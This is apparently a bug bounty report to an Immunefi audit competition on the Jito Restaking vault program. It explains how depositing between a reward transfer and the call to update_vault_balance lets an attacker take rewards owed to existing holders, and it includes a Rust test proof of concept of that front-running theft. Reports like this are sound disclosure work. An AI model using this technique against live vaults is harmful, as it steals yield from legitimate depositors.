# #37295 \[SC-High] Rewards can be stolen by depositing immediately after reward tokens get sent to vau

**Submitted on Dec 1st 2024 at 23:15:36 UTC by @Emmanuel001 for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

* **Report ID:** #37295
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/jito-foundation/restaking/tree/master/vault\\_program>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The update\_vault\_balance function is designed to reward VRT holders by redistributing staking rewards. However, it has a vulnerability: deposits made after reward tokens are sent to the vault but before update\_vault\_balance is called become eligible for those rewards. This allows attackers to monitor for rewards sent to the vault, deposit tokens immediately, and unfairly gain extra rewards at the expense of existing VRT holders

## Vulnerability Details

In order to reward vrt holders, protocol exposes a `update_vault_balance` function, which does the following:

* gets the current st token balance of the vault(new\_st\_balance)(<https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/update\\_vault\\_balance.rs#L44>)
* st\_rewards received is gotten by subtracting the vault.tokens\_deposited(token balance accounted for by the vault) from the new\_st\_balance.(<https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/update\\_vault\\_balance.rs#L47>)
* necessary fees, if any, gets deducted from the st\_rewards
* tokens\_deposited gets updated to the new\_st\_balance, which means that each vrt is worth more(<https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/update\\_vault\\_balance.rs#L60>)

So we can see that to reward vrt holders, rewarder first sends st\_tokens to the vault, then calls `update_vault_balance`. The issue is, any deposits made in between the rewarder sending st tokens, and calling `update_vault_balance`, will make the deposit elligible for the rewards. So an attacker can monitor blockchain for any st\_tokens sent to the vault, and then deposit immediately after, which would immediately make his deposited tokens to be worth more(at the expense of other vrt holders) when `update_vault_balance` gets called. This is a theft of rewards.

Consider the following scenario(summary of what happened in PoC):

* Alice deposits 1000 st tokens, gets minted 1000 vrt
* Fast forward an epoch, rewarder sends 1000 st tokens to vault
* Bob sees this, and immediately deposits 1000 st tokens, and gets minted 1000 vrt tokens
* Bob calls `update_vault_balance`
* Now, both Alice and Bob's vrt tokens are worth 1500 st each

## Impact Details

The vulnerability allows attackers to steal rewards meant for existing VRT holders by depositing tokens just before the update\_vault\_balance function is called, diluting the rewards for honest participants. This leads to economic loss for legitimate users.

## References

<https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/update\\_vault\\_balance.rs#L44> <https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/update\\_vault\\_balance.rs#L47> <https://github.com/jito-foundation/restaking/blob/master/vault\\_program/src/update\\_vault\\_balance.rs#L60>

## Proof of Concept

## Proof of Concept

* Within integration\_tests/tests/vault folder, create a file named "whitehat.rs"
* Be sure to include the whitehat.rs test file in integration\_tests/tests/vault/mod.rs
* Paste the following into the whitehat.rs file:

```rust
#[cfg(test)]
mod tests {
    use jito_vault_core::{
        config::Config,
        delegation_state::DelegationState,
        vault_update_state_tracker::VaultUpdateStateTracker,
        vault_operator_delegation::VaultOperatorDelegation,
    };
    use spl_associated_token_account::get_associated_token_address;
    use jito_vault_sdk::error::VaultError;
    use solana_sdk::{ msg, signature::{ Keypair, Signer }, pubkey::Pubkey };

    use crate::fixtures::{
        fixture::{ ConfiguredVault, TestBuilder },
        vault_client::{ assert_vault_error, VaultStakerWithdrawalTicketRoot },
    };
    use jito_vault_core::vault::BurnSummary;
    use jito_vault_sdk::instruction::VaultAdminRole;

    #[tokio::test]
    async fn test_steal_rewards_by_depositing_before_update_vault_balance() {
        //setup
        let num_operators = 1;
        let slasher_amounts = vec![];
        let deposit_fee_bps = 0;
        let withdrawal_fee_bps = 0;
        let reward_fee_bps = 0;
        let reward_amount = 1000;
        let MINT_AMOUNT = 1000;

        let mut fixture = TestBuilder::new().await;
        let ConfiguredVault {
            mut vault_program_client,
            restaking_program_client: _,
            vault_config_admin: _,
            vault_root,
            restaking_config_admin: _,
            operator_roots,
        } = fixture
            .setup_vault_with_ncn_and_operators(
                deposit_fee_bps,
                withdrawal_fee_bps,
                reward_fee_bps,
                num_operators,
                &slasher_amounts
            ).await
            .unwrap();

        let rewarder = Keypair::new();
        vault_program_client
            .configure_depositor(&vault_root, &rewarder.pubkey(), reward_amount).await
            .unwrap();

        let alice = Keypair::new();
        vault_program_client
            .configure_depositor(&vault_root, &alice.pubkey(), MINT_AMOUNT).await
            .unwrap();

        let bob = Keypair::new();
        vault_program_client
            .configure_depositor(&vault_root, &bob.pubkey(), MINT_AMOUNT).await
            .unwrap();

        //Alice deposits tokens
        vault_program_client
            .do_mint_to(&vault_root, &alice, MINT_AMOUNT, MINT_AMOUNT).await
            .unwrap();
        //fast forward an epoch

        let config = vault_program_client
            .get_config(&Config::find_program_address(&jito_vault_program::id()).0).await
            .unwrap();
        fixture.warp_slot_incremental(config.epoch_length()).await.unwrap();

        let slot = fixture.get_current_slot().await.unwrap();
        let vault_update_state_tracker = VaultUpdateStateTracker::find_program_address(
            &jito_vault_program::id(),
            &vault_root.vault_pubkey,
            slot / config.epoch_length()
        ).0;
        vault_program_client
            .initialize_vault_update_state_tracker(
                &vault_root.vault_pubkey,
                &vault_update_state_tracker
            ).await
            .unwrap();

        for operator in operator_roots {
            vault_program_client
                .crank_vault_update_state_tracker(
                    &vault_root.vault_pubkey,
                    &operator.operator_pubkey,
                    &VaultOperatorDelegation::find_program_address(
                        &jito_vault_program::id(),
                        &vault_root.vault_pubkey,
                        &operator.operator_pubkey
                    ).0,
                    &vault_update_state_tracker
                ).await
                .unwrap();
        }

        vault_program_client
            .close_vault_update_state_tracker(
                &vault_root.vault_pubkey,
                &vault_update_state_tracker,
                slot / config.epoch_length()
            ).await
            .unwrap();

        //after sometime, rewarder sends rewards to vault and update_vault_balance, but gets frontrun with a deposit call by Bob to steal part of the rewards meant for Alice the depositor
        vault_program_client
            .create_and_fund_reward_vault(&vault_root.vault_pubkey, &rewarder, reward_amount).await
            .unwrap();

        //bob frontruns with a deposit
        vault_program_client.do_mint_to(&vault_root, &bob, MINT_AMOUNT, MINT_AMOUNT).await.unwrap();

        //update_vault_balance
        vault_program_client.update_vault_balance(&vault_root.vault_pubkey).await.unwrap();

        //Now check the burn summary
        let mut vault_details = vault_program_client
            .get_vault(&vault_root.vault_pubkey).await
            .unwrap();

        let alice_vrt_account = fixture
            .get_token_account(
                &get_associated_token_address(&alice.pubkey(), &vault_details.vrt_mint)
            ).await
            .unwrap();
        let bob_vrt_account = fixture
            .get_token_account(
                &get_associated_token_address(&bob.pubkey(), &vault_details.vrt_mint)
            ).await
            .unwrap();

        let BurnSummary {
            vault_fee_amount: _,
            program_fee_amount: _,
            burn_amount: _,
            out_amount: alice_out_amount,
        } = vault_details.burn_with_fee(alice_vrt_account.amount).unwrap();

        let BurnSummary {
            vault_fee_amount: _,
            program_fee_amount: _,
            burn_amount: _,
            out_amount: bob_out_amount,
        } = vault_details.burn_with_fee(bob_vrt_account.amount).unwrap();

        assert_eq!(alice_out_amount, bob_out_amount);
        assert_eq!(bob_out_amount, MINT_AMOUNT + reward_amount / 2);
    }
}
```

* Run the PoC test
